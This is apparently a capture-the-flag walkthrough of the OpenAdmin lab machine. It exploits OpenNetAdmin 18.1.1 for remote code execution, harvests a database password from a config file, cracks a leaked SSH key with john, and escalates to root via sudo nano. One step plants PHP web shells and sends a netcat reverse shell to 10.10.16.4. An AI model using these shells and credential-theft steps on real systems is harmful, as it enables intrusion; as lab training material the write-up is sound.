### Foothold as www-data
##### Fuzz
Try fuzz with different directory list `/usr/share/wordlists/wfuzz/general/big.txt` and `/usr/share/seclists/Discovery/Web-Content/big.txt` if `autorecon` didn't find any of them.

Another one is `/usr/share/wordlists/dirbuster/directory-list-1.0.txt`

Also, pay more attention to 'Create' or 'Login' functions when doing a happy path.

##### Happy Path
1. http://10.129.51.132/music/index.html
2. Click Menu -> Login
3. http://10.129.51.132/ona/
4. The version number of OpenNetAdmin is 18.1.1

```bash
searchsploit OpenNetAdmin
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                 | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)  | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                   | php/webapps/47691.sh
------------------------------------------------------------------------------------------------

./47691.sh http://10.129.51.132/ona/
$ whoami
www-data
```

### Lateral Movement
When there is a web server. Looking for database credentials would be a good start. Like MySQL.
Eyes on something like 'Config' or 'Local'. from '/var/www/...' perhaps.

##### Enum database
The database name could be googled with the webserver.
Like Google opennetadmin (connect) database. `opennetadmin ona database config`
`/opt/ona/www/local/config/database_settings.inc.php`

* https://www.google.com/search?client=firefox-b-d&q=opennetadmin+ona+database+config
* https://opennetadmin.com/forum_archive/4/t-85.html

```bash
# Two users
ls /home
jimmy
joanna

pwd
/opt/ona/www

cat local/config/database_settings.inc.php
cat local/config/database_settings.inc.php | grep -i "pass" # Try it and seems password got reused
cat local/config/database_settings.inc.php | grep -i "pass" -C 10
$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

##### SSH Jimmy
```bash
❯ export IP=10.129.51.132
❯ ssh jimmy@$IP

39 packages can be updated.
11 updates are security updates.

Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ 
```

### Lateral Movement Part two to Joanna
Now, I have access to the remote machine as jimmy, start looking around for misconfiguration and possible vulnerabilities. One common place to check is the Apache configuration to see if there are any other virtual hosts listening. Since the `netstat` and `curl` shows that there is something else running. So Apache or Nginx would be the first to look at.

##### Hard & Interesting part
1. Enumerating from www-data found that a directory `/var/www/internal` belong to jimmy only or simply `find / -user jimmy 2>/dev/null`

```bash
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
```

2. (Optional) Crack the hash from `index.php`
```cmd
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758e
ebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1	sha512	Revealed
```

3. Find the port that running this service. There are a couple of ways.

```bash
netstat -tl

netstat -tulpn

netstat -ano | grep tcp

netstat -naep | grep LISTEN | grep -v LISTENING

cat /etc/apache2/sites-enabled/internal.conf
```

4. Without the hash
```bash
curl -s localhost:52846
curl -s localhost:52846/index.php
curl -s localhost:52846/main.php

jimmy@openadmin:/var/www/internal$ curl -s localhost:52846/main.php
<pre>
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>							<- Here is CTF tip for the password contains ninja
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

5. Using the hash (This step doesn't necessary unless you can't reach the main.php without pass)
```bash
curl -d "username=jimmy&password=Revealed" -X POST http://localhost:52846/main.php
```

or Pivoting through SSH port forwarding.

```bash
ssh -R 1337:127.0.0.1:52846 kali@targetIP
```

The command above creates a remote SSH tunnel, which forwards all connections from port 1337 on our host to port 52846 on the box. Make sure that the SSH server is running and permits root login(not sure normal kali user works or not). The application can now be accessed by browsing to `http://127.0.0.1:1337`

6. Use the private key
```bash
/usr/share/john/ssh2john.py key > hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh hash
# Bonus
cat /usr/share/wordlists/rockyou.txt | grep ninja >> rockyou_ninja.txt
john --wordlist=rockyou_ninja.txt --format=ssh hash

bloodninjas      (key)
```

7. Alternative way as Bonus: RCE on the 52846 running server
```bash victim
echo '<?php echo exec("id");?>' > shell.php
curl -s localhost:52846/shell.php

echo '<?php system($_GET["cmd"]);?>' > shell2.php
curl -s localhost:52846/shell2.php?cmd=whoami
```

```bash kali
curl -s localhost:52846/shell2.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.4%209001%20%3E%2Ftmp%2Ff

joanna@openadmin:/home/joanna/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

### Root
```bash
ssh joanna@$IP -i key
Enter passphrase for key 'key': bloodninjas
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
joanna@openadmin:~$

sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

sudo /bin/nano /opt/priv

```
Ctrl+r and Ctrl+x

* https://gtfobins.github.io/gtfobins/nano/